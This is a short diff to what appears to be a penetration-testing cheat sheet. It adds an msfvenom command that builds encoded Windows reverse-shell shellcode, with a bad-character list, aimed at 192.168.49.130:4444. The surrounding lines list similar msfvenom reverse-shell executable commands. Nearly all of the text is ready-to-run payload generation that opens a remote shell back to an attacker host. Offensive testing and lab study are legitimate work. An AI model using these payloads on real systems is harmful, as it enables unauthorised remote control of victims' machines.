@@ -59,6 +59,10 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
+
+
+#Bad chars ID'd
+msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.49.130 -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LPORT=4444 -e x86/alpha_mixed -f c
 ```
 
 #### Bind Shell
